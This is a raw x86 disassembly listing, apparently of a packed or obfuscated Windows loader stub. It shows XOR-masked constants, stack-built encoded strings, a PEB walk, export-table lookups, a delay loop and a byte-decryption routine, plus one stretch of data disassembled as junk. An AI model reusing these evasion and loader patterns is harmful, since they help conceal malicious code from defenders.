  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
